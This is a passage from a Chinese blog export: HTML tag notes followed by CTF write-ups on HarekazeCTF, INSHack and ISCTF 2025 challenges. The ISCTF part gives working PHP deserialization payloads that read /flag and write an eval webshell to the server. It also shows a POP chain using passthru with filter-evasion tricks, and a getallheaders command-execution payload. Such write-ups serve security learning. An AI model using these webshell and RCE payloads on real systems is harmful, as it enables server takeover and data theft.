和加粗没区别&lt;i&gt;...&lt;/i&gt;\t斜体  &lt;em&gt;&lt;/em&gt;\t定义着重字体 和斜体没区别&lt;u&gt;...&lt;/u&gt;\t下划线&lt;s&gt;...&lt;/s&gt;\t删除线 &lt;del&gt;...&lt;\\del&gt;\t删除线  和删除线无区别&lt;sub&gt;...&lt;/sub&gt;\t下标\t例如：x&lt;sub&gt;2&lt;/sub&gt;得到x₂&lt;sup&gt;...&lt;/sup&gt;\t上标\t例如：x&lt;sup&gt;2&lt;/sup&gt;得到x²&lt;font&gt;...&lt;/font&gt;\t字体标签\t    常用属性： \t    color\t颜色\t    face\t字体\t    size\t字号    例如：&lt;font color=&quot;red&quot; face=&quot;黑体&quot; size=&quot;7&quot;&gt;字体标签&lt;/font&gt;网页上显示字体标签，并修改字体为宋体，颜色为红色，字号为7\n\nform表单标签&lt;form&gt;&lt;/form&gt;\t所有标签都有的属性：\t         id属性   用来标识元素的唯一性\t         name属性 提交数据时的参数名\t         style属性 设置元素的行内样式\t         class属性 设置元素的样式名\t       \t必有属性：\t  action\t指定表单提交的地址，一般为服务器接口地址\t  method\t指定表单提交的方式，一般为get或post\t\t   get提交 GET           post提交 POST    target 提交数据时打开窗口的方式    \t  _self 当前窗口          _blank 空白窗口            get请求和post请求的区别：1.get请求时参数会跟在浏览器地址后面，而post请求不会2.get请求相当于post而言，不那么安全3.get请求传递的数据长度是有限的，而post请求基本没有（长度与服务器有关）        4.get请求比post快（2倍）        5.get请求有缓存，而post无                form是块级元素   表单提交时，必须设置表单元素的name属性值，否则无法获取数据        表单需要结合表单元素一起使用\n\ninput标签&lt;input type=&quot;&quot;&gt;\ttype属性：   text\t文本输入框   password\t密码输入框   checkbox\t 复选框\t   radio\t单选框，如果需要单选，要设置name属性   submit\t提交按钮，默认有一个“提交”的按钮   reset\t重置按钮，默认有一个“重置”的按钮\t   button\t按钮，默认只有一个方格，需要设置value显示按钮的值   color\t颜色选择框\t   file\t上传文件按钮，如果需要上传多个文件，需要设置multiple   number\t数字输入框，只能输入数字\t   date\t日期选择框\t   time\t时间选择框\t\t   常用属性：\t   value    元素的值    readonly  只读状态\t   maxlength  最多输入的长度\t   disabled   禁用标签\t   checked\t单选框、复选框中表示默认选中\t   disabled\t表示禁用，不会被选择。如果要提交数据必须设置name属性\n\ntextarea文本框标签&lt;textarea&gt;&lt;/textarea&gt;\t常用属性：\t   cols\t规定文本区域内可见的列数\t   rows\t规定文本区域内可见的行数\t   value\t定义文本区域的内容\t   disabled\t设置为disabled将禁用文本区域\t   maxlength\t限制用户输入的最大字符数\t   placeholder\t规定一个简短的提示，描述文本区域期望的输入值\t   required\t设置为required会在提交表单时验证字段是否已填写‌\n\nlable标签&lt;lable&gt;&lt;/lable&gt;\t标签可以 直接包含 表单 和 相关文字信息 , 点击 label 标签的范围 , 就可以触发表单的操作\t常用属性：   for\t该属性值应该与相关控件的id属性值相同当用户点击&lt;label&gt;内的任何部分时，浏览器会自动将焦点转移到与之相关的表单控件上       例如：   &lt;label for=&quot;username&quot;&gt;用户名：&lt;/label&gt;        &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot;&gt;        当点击用户名时会自动转移到输入文本框中\n\n下拉框标签&lt;select&gt;&lt;/select&gt;\t常用属性：     multiple  设置下拉框多选     size      设置下拉框可见选项数     disabled  禁用元素     option：下拉框的选项标签      selected  默认选中值      disabled  禁用某个选项      value     提交给服务器的选项值例如：&lt;form method=&quot;post&quot; action=&quot;&quot;&gt;        &lt;select multiple=&quot;multiple&quot; name=&quot;q[]&quot;&gt;        &lt;option value=&quot;&quot;&gt;选择一个站点&lt;/option&gt;        &lt;option value=&quot;RUNOOB&quot;&gt;Runoob&lt;/option&gt;        &lt;option value=&quot;GOOGLE&quot;&gt;Google&lt;/option&gt;      &lt;option value=&quot;TAOBAO&quot;&gt;Taobao&lt;/option&gt;       &lt;/select&gt;        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;\n\n"},{"title":"[HarekazeCTF2019]Easy_Notes","url":"/2025/05/28/HarekazeCTF2019-Easy-Notes/","content":"[HarekazeCTF2019]Easy_Notes这个题目也是写完了，考的是session反序列化和session伪造，这两个都是没怎么学过的东西，靶场还一直出问题，唉\n开始一个登录界面，发现随便输入什么都可以登录进去。进入后发现，是一个留言界面，留言分为标题和内容。还有一个选项为get flag，点开后发现我们不是admin\n\n\n即使将登录名字改为admin也不行，这个时候只能去看wp。\n看完wp发现这个题目本来是提供了源码的，在github上面看了源码，源码很多但是有用的没多少\n//flag.php      &lt;section&gt;        &lt;h2&gt;Get flag&lt;/h2&gt;        &lt;p&gt;          &lt;?php          if (is_admin()) &#123;            echo &quot;Congratulations! The flag is: &lt;code&gt;&quot; . getenv(&#x27;FLAG&#x27;) . &quot;&lt;/code&gt;&quot;;          &#125; else &#123;            echo &quot;You are not an admin :(&quot;;          &#125;          ?&gt;        &lt;/p&gt;      &lt;/section&gt;//我们接着去找is_admin()                            //lib.php  这里面有一些获取信息的函数              function set_user($user) &#123;  $_SESSION[&#x27;user&#x27;] = $user;&#125;function get_user() &#123;  return $_SESSION[&#x27;user&#x27;];&#125;function is_admin() &#123;  if (!isset($_SESSION[&#x27;admin&#x27;])) &#123;//这个代码会先读取session然后再把admin的值拿出来，但由于我们不能直接sess文件，我们只能伪造sess文件，通过修改SESSIONID让其去读取伪造文件    return false;  &#125;  return $_SESSION[&#x27;admin&#x27;] === true;&#125;// note-related functionsfunction get_notes() &#123;  if (!isset($_SESSION[&#x27;notes&#x27;])) &#123;    $_SESSION[&#x27;notes&#x27;] = [];  &#125;  return $_SESSION[&#x27;notes&#x27;];&#125;function add_note($title, $body) &#123;  $notes = get_notes();  array_push($notes, [    &#x27;title&#x27; =&gt; $title,    &#x27;body&#x27; =&gt; $body,    &#x27;id&#x27; =&gt; hash(&#x27;sha256&#x27;, microtime())  ]);  $_SESSION[&#x27;notes&#x27;] = $notes;&#125;//发现我们需要让admin的SESSION存在\n\n通过观察上面的代码，当我们进行登录的时候即使名字是admin，但是存入的是$_SESSION[&#39;user&#39;]，我们需要想办法去让$_SESSION[&#39;admin&#39;]写入\n我们写入的留言需要以文件形式保存在临时目录，我们看到源码中默认session保存路径中\ndefine(&#x27;TEMP_DIR&#x27;, &#x27;/var/www/tmp&#x27;);session_save_path(TEMP_DIR);\n\n都是在临时目录下，我们再来看下保存留言的代码\nif (!isset($_GET[&#x27;type&#x27;]) || empty($_GET[&#x27;type&#x27;])) &#123;  $type = &#x27;zip&#x27;;//如果type为空这后缀默认为zip&#125; else &#123;  $type = $_GET[&#x27;type&#x27;];&#125;$filename = get_user() . &#x27;-&#x27; . bin2hex(random_bytes(8)) . &#x27;.&#x27; . $type;//对文件名进行拼接$filename = str_replace(&#x27;..&#x27;, &#x27;&#x27;, $filename); // avoid path traversal 对路径进行替换防止目录跨越$path = TEMP_DIR . &#x27;/&#x27; . $filename;//保存路径也是临时目录if ($type === &#x27;tar&#x27;) &#123;  $archive = new PharData($path);  $archive-&gt;startBuffering();&#125; else &#123;  // use zip as default  $archive = new ZipArchive();  $archive-&gt;open($path, ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE); //创建并打开文件&#125;//上面代码对两种文件进行保存for ($index = 0; $index &lt; count($notes); $index++) &#123;  $note = $notes[$index];  $title = $note[&#x27;title&#x27;];  $title = preg_replace(&#x27;/[^!-~]/&#x27;, &#x27;-&#x27;, $title);  $title = preg_replace(&#x27;#[/\\\\?*.]#&#x27;, &#x27;-&#x27;, $title); // delete suspicious characters//对这些进行过滤  $archive-&gt;addFromString(&quot;&#123;$index&#125;_&#123;$title&#125;.json&quot;, json_encode($note));//将内容写入zip文件&#125;if ($type === &#x27;tar&#x27;) &#123;  $archive-&gt;stopBuffering();&#125; else &#123;  $archive-&gt;close();&#125;\n\n分析代码，将我们的留言写入了zip活tar文件，但是文件内容没什么用。但是我们可以拿到随机生成的文件名，去控制读取的sess文件\n这个时候就用到了我们的Session反序列化，Session反序列化发生在php文件对sess文件中数据进行读取的时候进行反序列化。我们可以通过伪造sess文件名，文件内容包含反序列化内容对admin改为1即可\n我们需要知道的是本来Session[‘admin’]是不存在的，我们需要的就是，反序列化出admin的值，让其为true\n我们首先要知道php为处理器中session的储存形式为 键名|值的序列化结果，于是我们构造\nexp\n&lt;?phpecho serialize(6);//i:6;\n\n我们构造admin|i:6;，但是这样还不行，由于我们不是想该代码中那个属性的值，而是$_SESSION[&#39;admin&#39;]为true，我们直接放入的结果就是\n&#123;&quot;title&quot;:&quot;admin|i:6;&quot;,&quot;body&quot;:&quot;fuck&quot;,&quot;id&quot;:&quot;3b4d9c26a0b728d6055ed9e2f8d972132df09586a6a0c41ec95cc7a2ea7eaf01&quot;&#125;\n\n这样很明显键名变成了&#123;&quot;title&quot;:&quot;admin于是我们需要将前面的给挡住于是我们的paylaod为|N;admin|i:6;这样放入后就成了\n&#123;&quot;title&quot;:&quot;|N;admin|i:6;&quot;,&quot;body&quot;:&quot;fuck&quot;,&quot;id&quot;:&quot;3b4d9c26a0b728d6055ed9e2f8d972132df09586a6a0c41ec95cc7a2ea7eaf01&quot;&#125;\n\n至于后面那些多于的地方应该会因为;终止读取吧\n"},{"title":"Http","url":"/2025/02/08/Http/","content":""},{"title":"[HarekazeCTF2019]Avatar_Uploader_1","url":"/2025/04/29/HarekazeCTF2019-Avatar-Uploader-1/","content":"[HarekazeCTF2019]Avatar_Uploader_1这个是个文件上传题目，当我们上传符合规定大小和分辨率的图片后头像就会更换，题目本来就是有源码的，我们把源码下载下来\n&lt;?phperror_reporting(0);require_once(&#x27;config.php&#x27;);require_once(&#x27;lib/util.php&#x27;);require_once(&#x27;lib/session.php&#x27;);$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);// check whether file is uploadedif (!file_exists($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]) || !is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;])) &#123;  error(&#x27;No file was uploaded.&#x27;);&#125;// check file sizeif ($_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &gt; 256000) &#123;  error(&#x27;Uploaded file is too large.&#x27;);&#125;// check file type$finfo = finfo_open(FILEINFO_MIME_TYPE);$type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);finfo_close($finfo);if (!in_array($type, [&#x27;image/png&#x27;])) &#123;  error(&#x27;Uploaded file is not PNG format.&#x27;);&#125;// check file width/height$size = getimagesize($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123;  error(&#x27;Uploaded image is too large.&#x27;);&#125;if ($size[2] !== IMAGETYPE_PNG) &#123;  // I hope this never happens...  error(&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27; . getenv(&#x27;FLAG1&#x27;) . &#x27;&lt;/code&gt;&#x27;);&#125;// ok$filename = bin2hex(random_bytes(4)) . &#x27;.png&#x27;;move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_DIR . &#x27;/&#x27; . $filename);$session-&gt;set(&#x27;avatar&#x27;, $filename);flash(&#x27;info&#x27;, &#x27;Your avatar has been successfully updated!&#x27;);redirect(&#x27;/&#x27;);\n\n代码看下来发现有直接输出flag的地方\n$size = getimagesize($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123;  error(&#x27;Uploaded image is too large.&#x27;);&#125;if ($size[2] !== IMAGETYPE_PNG) &#123;  // I hope this never happens...  error(&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27; . getenv(&#x27;FLAG1&#x27;) . &#x27;&lt;/code&gt;&#x27;);&#125;\n\n我们需要了解一下，getimagesize()函数\ngetimagesize() 是 PHP 中一个非常有用的函数，用于获取图像文件的基本信息，包括尺寸、类型等\n$image_info = getimagesize(&quot;path/to/image.jpg&quot;);Array(    [0] =&gt; 宽度（像素）    [1] =&gt; 高度（像素）    [2] =&gt; 图像类型（IMAGETYPE_XXX 常量）    [3] =&gt; 可用于HTML img标签的宽高字符串（如：width=&quot;100&quot; height=&quot;200&quot;）    [bits] =&gt; 图像的比特深度    [channels] =&gt; 对于RGB图像为3，对于CMYK图像为4    [mime] =&gt; 图像的MIME类型)\n\n在前面还有一个判断content-type的，我们还需要了解一下finfo_open和finfo_file\nfinfo_open() 是 PHP 中用于创建一个文件信息资源的函数，通常与 finfo_file() 配合使用来检测文件的 MIME 类型和其他信息。\n$finfo = finfo_open(FILEINFO_MIME_TYPE); // 创建一个文件信息对象$mime_type = finfo_file($finfo, &quot;example.jpg&quot;); // 获取文件的MIME类型finfo_close($finfo); // 关闭资源\n\n实际上finfo_open相当于返回一个配置文件，finfo_file()则是获取文件的各种内容并返回\n逻辑上肯定是不行的，content-type要是png，但是又不能是png，这个时候就需要绕过函数\n为了获取到flag，我们需要绕过函数finfo_file()或函数getimagesize() 的验证函数finfo_file()其主要是识别PNG文件十六进制下的第一行信息，若保留文件头信息，破坏掉文件长宽等其余信息，也就可以绕过getimagesize() 函数的检验使用Hex Fiend将图片其余数据删掉，只保留文件头：\n&lt;?phplist($width, $height, $type, $attr) = getimagesize(&quot;444.png&quot;);echo &quot;宽度为：&quot; . $width;echo &quot;高度为：&quot; . $height;echo &quot;类型为：&quot; . $type;echo &quot;属性：&quot; . $attr;var_dump(getimagesize(&quot;444.png&quot;));?&gt;\n\n\n\n\n\n\n"},{"title":"[INSHack2018]Self_Congratulation","url":"/2025/10/22/INSHack2018-Self-Congratulation/","content":"[INSHack2018]Self_Congratulation一个这么简单的杂项我为什么没想到，看来还是需要思维灵活一点\n下载下来是一张图片，经过分析没看见有什么隐写，那flag就在图片当中\n\n\n我们注意到I上面有一片类似二维码的东西，我们放大\n\n\n然后将白色块变为0黑色变为1即可转化为二进制\n001100010011001000110011001101000011010100110110001101110011100000\n\n解码得到flag\n\n\nflag&#123;12345678&#125;\n\n"},{"title":"ISCTF 2025","url":"/2025/12/15/ISCTF/","content":"ISCTF最近的新生赛，但是为了复习四级没有打，但是现在四级好像过不了了，四级怎么这么坏啊\n1.Web来签个到吧虽然是签到题目，但是还是有点难度的和其他新生赛比的话\n题目给源码了，直接下载附件发现是一个php反序列化的题目。\n//index.php&lt;?phprequire_once &quot;./config.php&quot;;require_once &quot;./classes.php&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] === &quot;POST&quot;) &#123;    $s = $_POST[&quot;shark&quot;] ?? &#x27;喵喵喵?&#x27;;    if (str_starts_with($s, &quot;blueshark:&quot;)) &#123;        $ss = substr($s, strlen(&quot;blueshark:&quot;));        $o = @unserialize($ss);        $p = $db-&gt;prepare(&quot;INSERT INTO notes (content) VALUES (?)&quot;);        $p-&gt;execute([$ss]);        echo &quot;save sucess!&quot;;        exit(0);    &#125; else &#123;        echo &quot;喵喵喵?&quot;;        exit(1);    &#125;&#125;\n\n我们通过POST传参的shrak会被反序列化然后再将其写入数据库中\n//api.php&lt;?phprequire_once &quot;./config.php&quot;;require_once &quot;./classes.php&quot;;$id = $_GET[&quot;id&quot;] ?? &#x27;喵喵喵?&#x27;;$s = $db-&gt;prepare(&quot;SELECT content FROM notes WHERE id = ?&quot;);$s-&gt;execute([$id]);$row = $s-&gt;fetch(PDO::FETCH_ASSOC);if (! $row) &#123;    die(&quot;喵喵喵?&quot;);&#125;$cfg = unserialize($row[&quot;content&quot;]);if ($cfg instanceof ShitMountant) &#123;    $r = $cfg-&gt;fetch();    echo &quot;ok!&quot; . &quot;&lt;br&gt;&quot;;    echo nl2br(htmlspecialchars($r));&#125;else &#123;    echo &quot;喵喵喵?&quot;;&#125;?&gt;\n\n这个则是通过id查询，然后将查询到的数据进行反序列化，然后再将其调用fetch函数后的结果回显到前端\n//class.php&lt;?phpclass FileLogger &#123;    public $logfile = &quot;/tmp/notehub.log&quot;;    public $content = &quot;&quot;;    public function __construct($f=null) &#123;        if ($f) &#123;            $this-&gt;logfile = $f;        &#125;    &#125;//反序列化的时候不会调用__construct而是__wakeup    public function write($msg) &#123;        $this-&gt;content .= $msg . &quot;\\n&quot;;        file_put_contents($this-&gt;logfile, $this-&gt;content, FILE_APPEND);    &#125;    public function __destruct() &#123;        if ($this-&gt;content) &#123;            file_put_contents($this-&gt;logfile, $this-&gt;content, FILE_APPEND);        &#125;    &#125;&#125;class ShitMountant &#123;    public $url;    public $logger;    public function __construct($url) &#123;        $this-&gt;url = $url;        $this-&gt;logger = new FileLogger();    &#125;    public function fetch() &#123;        $c = file_get_contents($this-&gt;url);//第一个漏洞点，我们可以直接读取文件        if ($this-&gt;logger) &#123;            $this-&gt;logger-&gt;write(&quot;fetched ==&gt; &quot; . $this-&gt;url);        &#125;        return $c;    &#125;    public function __destruct() &#123;        $this-&gt;fetch();    &#125;&#125;?&gt;\n\n总之我感觉这个题目出的好奇怪，莫非作为签到题的原因就是可以有多个解法吗\n1.直接读文件\n这个不需要构造pop链，直接读/flag就行了\n$a=new ShitMountant();$a-&gt;url=&#x27;/flag&#x27;;echo serialize($a);//O:12:&quot;ShitMountant&quot;:2:&#123;s:3:&quot;url&quot;;s:5:&quot;/flag&quot;;s:6:&quot;logger&quot;;N;&#125;\n\n先访问index.php，将其存入数据库\n//index.php//POSTshark=blueshark:O:12:&quot;ShitMountant&quot;:2:&#123;s:3:&quot;url&quot;;s:5:&quot;/flag&quot;;s:6:&quot;logger&quot;;N;&#125;\n\n然后再访问api.php?id=1即可查找到我们的序列化数据然后读取\n\n\n\n\n2.往php文件里面写马\n有两个file_put_contents，然后两个都是可控的，我们都试一下。\n由于我们是写Webshell，我们可以不要回显，也就是不需要再到api.php里面了，当然也不需要类的限制了，我们直接利用FileLogger的destruct进行写马\n$b=new FileLogger();$b-&gt;content=&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;;$b-&gt;logfile=&#x27;classes.php&#x27;;echo serialize($b);O:10:&quot;FileLogger&quot;:2:&#123;s:7:&quot;logfile&quot;;s:11:&quot;classes.php&quot;;s:7:&quot;content&quot;;s:28:&quot;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&quot;;&#125;\n\n我一开始想往classes.php中写马的，因为其他文件都存在终止函数，但是提示我没有写入权限\n\n\n我也是傻逼了，随便写一个其他的文件不就行了吗\n\n\n\n\n然后就是利用api.php进行写入，就是触发Write方法，然后写入，在我看来纯属麻烦\n$a=new ShitMountant();$b=new FileLogger();$b-&gt;content=&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;;$b-&gt;logfile=&#x27;shell2.php&#x27;;$a-&gt;url=&#x27;/etc/passwd&#x27;;//为了避免php8报错$a-&gt;logger=$b;echo serialize($a);O:12:&quot;ShitMountant&quot;:2:&#123;s:3:&quot;url&quot;;s:11:&quot;/etc/passwd&quot;;s:6:&quot;logger&quot;;O:10:&quot;FileLogger&quot;:2:&#123;s:7:&quot;logfile&quot;;s:10:&quot;shell2.php&quot;;s:7:&quot;content&quot;;s:28:&quot;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&quot;;&#125;&#125;\n\n成功写马\n\n\n拿到flag\n\n\n多试了几次，写了好几个马\nezpop &lt;?phperror_reporting(0);class begin &#123;    public $var1;    public $var2;    function __construct($a)    &#123;        $this-&gt;var1 = $a;    &#125;    function __destruct() &#123;        echo $this-&gt;var1;//起点，可触发toString    &#125;    public function __toString() &#123;        $newFunc = $this-&gt;var2;        return $newFunc();    &#125;&#125;class starlord &#123;    public $var4;    public $var5;    public $arg1;    public function __call($arg1, $arg2) &#123;        $function = $this-&gt;var4;//可触发invoke        return $function();    &#125;    public function __get($arg1) &#123;        $this-&gt;var5-&gt;ll2(&#x27;b2&#x27;);    &#125;&#125;class anna &#123;    public $var6;    public $var7;    public function __toString() &#123;        $long = @$this-&gt;var6-&gt;add();//未知函数可触发call        return $long;    &#125;    public function __set($arg1, $arg2) &#123;        if ($this-&gt;var7-&gt;tt2) &#123;            echo &quot;yamada yamada&quot;;        &#125;    &#125;&#125;class eenndd &#123;    public $command;    public function __get($arg1) &#123;        if (preg_match(&quot;/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i&quot;, $this-&gt;command))&#123;            echo &quot;nonono&quot;;        &#125;else &#123;            eval($this-&gt;command);//命令执行点        &#125;    &#125;&#125;class flaag &#123;    public $var10;    public $var11=&quot;1145141919810&quot;;    public function __invoke() &#123;        if (md5(md5($this-&gt;var11)) == 666) &#123;            return $this-&gt;var10-&gt;hey;//访问未知变量触发get        &#125;    &#125;&#125;if (isset($_POST[&#x27;ISCTF&#x27;])) &#123;    unserialize($_POST[&quot;ISCTF&quot;]);&#125;else &#123;    highlight_file(__FILE__);&#125; \n\n不知道为什么，感觉这个题目也好奇怪\n奇怪的原因就是在我们对所有属性可控的情况下，有好几个toString，然后这几个toString都是可以串起来的，也就是我们闲着没事做可以把每个toString触发一遍，但是我肯定懒得搞\n根据pop链到get后，我们就需要绕过了，passthru没有被过滤，反引号也没有，关键词过滤和空格过滤都很简单\npop\n&lt;?phpclass begin &#123;    public $var1;    public $var2;&#125;class starlord &#123;    public $var4;    public $var5;    public $arg1;&#125;class anna &#123;    public $var6;    public $var7;&#125;class eenndd &#123;    public $command;&#125;class flaag &#123;    public $var10;    public $var11=&quot;1145141919810&quot;;&#125;$a=new begin();$b=new begin();$c=new flaag();$d=new eenndd();$d-&gt;command=&#x27;passthru(&quot;ca\\t$&#123;IFS&#125;/flag&quot;);&#x27;;//$d-&gt;command=&quot;passthru(&#x27;ca\\\\t\\$&#123;IFS&#125;/fla?&#x27;);&quot;;$c-&gt;var10=$d;$c-&gt;var11=213;$b-&gt;var2=$c;$a-&gt;var1=$b;echo serialize($a);//O:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;O:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;N;s:4:&quot;var2&quot;;O:5:&quot;flaag&quot;:2:&#123;s:5:&quot;var10&quot;;O:6:&quot;eenndd&quot;:1:&#123;s:7:&quot;command&quot;;s:28:&quot;passthru(&quot;ca\\t$&#123;IFS&#125;/fla?&quot;);&quot;;&#125;s:5:&quot;var11&quot;;i:213;&#125;&#125;s:4:&quot;var2&quot;;N;&#125;由于&#123;&#125;在php中属于特殊字符会进行变量解析，所以我们需要改为单引号才能使用，我们也可以直接在序列化的时候使用单引号，只不过需要转义//ISCTF=O:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;O:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;N;s:4:&quot;var2&quot;;O:5:&quot;flaag&quot;:2:&#123;s:5:&quot;var10&quot;;O:6:&quot;eenndd&quot;:1:&#123;s:7:&quot;command&quot;;s:28:&quot;passthru(&#x27;ca\\t$&#123;IFS&#125;/fla?&#x27;);&quot;;&#125;s:5:&quot;var11&quot;;i:213;&#125;&#125;s:4:&quot;var2&quot;;N;&#125;\n\n然后就是md5那里直接爆破一下就行了\nfor($i=1;$i&lt;=10000;$i++)&#123;   if (md5(md5($i)) == 666) &#123;        echo $i;        break;   &#125;&#125;\n\n\n\n然后就是如果$&#123;IFS&#125;被过滤了，我们还可以使用类似%09(Tab)和%0a(回车)这些进行绕过，这里可能是序列化数据不能有回车的原因，后面想了一下应该是linux命令中不能直接出现回车，所以我们这里需要使用%09进行绕过\n这个时候就有一个问题需要注意一下，如果我们在序列化的时候直接写%09就会出现\nO:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;O:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;N;s:4:&quot;var2&quot;;O:5:&quot;flaag&quot;:2:&#123;s:5:&quot;var10&quot;;O:6:&quot;eenndd&quot;:1:&#123;s:7:&quot;command&quot;;s:19:&quot;passthru(&quot;ls%09\\&quot;);&quot;;&#125;s:5:&quot;var11&quot;;i:213;&#125;&#125;s:4:&quot;var2&quot;;N;&#125;//然后等我们传到后端的时候会进行url解码，导致原来三个字符的%09变为一个字符的Tab键，导致序列化数据错误\n\n我们解决这个的办法就是先使用一个字符进行占位，然后再把那个字符改为%09即可\nO:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;O:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;N;s:4:&quot;var2&quot;;O:5:&quot;flaag&quot;:2:&#123;s:5:&quot;var10&quot;;O:6:&quot;eenndd&quot;:1:&#123;s:7:&quot;command&quot;;s:17:&quot;passthru(&quot;ls%09\\&quot;);&quot;;&#125;s:5:&quot;var11&quot;;i:213;&#125;&#125;s:4:&quot;var2&quot;;N;&#125;\n\n成功执行\n\n\n\n\n拿到flag\n\n\n\n\n\n\nezrce &lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;code&#x27;]))&#123;    $code = $_GET[&#x27;code&#x27;];    if (preg_match(&#x27;/^[A-Za-z\\(\\)_;]+$/&#x27;, $code)) &#123;        eval($code);    &#125;else&#123;        die(&#x27;师傅，你想拿flag？&#x27;);    &#125;&#125; \n\n看见这个正则，很明显的无参rce，这里由于没有进行任何过滤，我们的flag也在根目录，于是就不能使用函数获取点号的方式了，这里使用getallheaders\nGET /?code=system(current(getallheaders())); HTTP/1.1Host: challenge.imxbt.cn:31998User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brConnection: keep-aliveUpgrade-Insecure-Requests: 1Priority: u=0, iPragma: no-cacheCache-Control: no-cacheContent-Type: cat /flag\n\n获取到的数组具体情况具体分析，我这里使用的是Content-Type字段，虽然GET请求方式没有，但是还是可以获取到的\n\n\n\n\nBypass我实在不知道为什么这个题目会比ezpop解出来的人数还多，这个题目还考到了我的知识盲区\n &lt;?phpclass FLAG&#123;    private $a;    protected $b;    public function __construct($a, $b)        &#123;            $this-&gt;a = $a;            $this-&gt;b = $b;            $this-&gt;check($a,$b);            eval($a.$b);        &#125;    public function __destruct()&#123;            $a = (string)$this-&gt;a;            $b = (string)$this-&gt;b;            if ($this-&gt;check($a,$b))&#123;                $a(&quot;&quot;, $b);            &#125;            else&#123;                echo &quot;Try again!&quot;;            &#125;        &#125;    private function check($a, $b) &#123;        $blocked_a = [&#x27;eval&#x27;, &#x27;dl&#x27;, &#x27;ls&#x27;, &#x27;p&#x27;, &#x27;escape&#x27;, &#x27;er&#x27;, &#x27;str&#x27;, &#x27;cat&#x27;, &#x27;flag&#x27;, &#x27;file&#x27;, &#x27;ay&#x27;, &#x27;or&#x27;, &#x27;ftp&#x27;, &#x27;dict&#x27;, &#x27;\\.\\.&#x27;, &#x27;h&#x27;, &#x27;w&#x27;, &#x27;exec&#x27;, &#x27;s&#x27;, &#x27;open&#x27;];        $blocked_b = [&#x27;find&#x27;, &#x27;filter&#x27;, &#x27;c&#x27;, &#x27;pa&#x27;, &#x27;proc&#x27;, &#x27;dir&#x27;, &#x27;regexp&#x27;, &#x27;n&#x27;, &#x27;alter&#x27;, &#x27;load&#x27;, &#x27;grep&#x27;, &#x27;o&#x27;, &#x27;file&#x27;, &#x27;t&#x27;, &#x27;w&#x27;, &#x27;insert&#x27;, &#x27;sort&#x27;, &#x27;h&#x27;, &#x27;sy&#x27;, &#x27;\\.\\.&#x27;, &#x27;array&#x27;, &#x27;sh&#x27;, &#x27;touch&#x27;, &#x27;e&#x27;, &#x27;php&#x27;, &#x27;f&#x27;];//过滤了这么多东西，还过滤了单个字符看来不能用正常方法了        $pattern_a = &#x27;/&#x27; . implode(&#x27;|&#x27;, array_map(&#x27;preg_quote&#x27;, $blocked_a, [&#x27;/&#x27;])) . &#x27;/i&#x27;;        $pattern_b = &#x27;/&#x27; . implode(&#x27;|&#x27;, array_map(&#x27;preg_quote&#x27;, $blocked_b, [&#x27;/&#x27;])) . &#x27;/i&#x27;;        if (preg_match($pattern_a, $a) || preg_match($pattern_b, $b)) &#123;            return false;        &#125;        return true;    &#125;  &#125;if (isset($_GET[&#x27;exp&#x27;])) &#123;    $p = unserialize($_GET[&#x27;exp&#x27;]);    var_dump($p);&#125;else&#123;    highlight_file(&quot;index.php&quot;);&#125; \n\n看完代码，主要就是在destruct中函数执行的地方，但是两个变量都需要过waf，然后从waf和$a(&quot;&quot;, $b);参数知道，我们应该使用creat_function\n但是这里过滤的太多了，很难直接命令执行然后输出，我有两种解法，首先就是利用php对双引号内字符串进行解析的特性，使用进制绕过。 还有就是可以利用问号没有被过滤，利用var_dump和反引号进行命令执行并输出\n1.进制绕过\n根据waf，我们可以直接闭合然后进行代码执行，但是难的就来了我们需要绕过过滤，我们来看waf\n$blocked_b = [&#x27;find&#x27;, &#x27;filter&#x27;, &#x27;c&#x27;, &#x27;pa&#x27;, &#x27;proc&#x27;, &#x27;dir&#x27;, &#x27;regexp&#x27;, &#x27;n&#x27;, &#x27;alter&#x27;, &#x27;load&#x27;, &#x27;grep&#x27;, &#x27;o&#x27;, &#x27;file&#x27;, &#x27;t&#x27;, &#x27;w&#x27;, &#x27;insert&#x27;, &#x27;sort&#x27;, &#x27;h&#x27;, &#x27;sy&#x27;, &#x27;\\.\\.&#x27;, &#x27;array&#x27;, &#x27;sh&#x27;, &#x27;touch&#x27;, &#x27;e&#x27;, &#x27;php&#x27;, 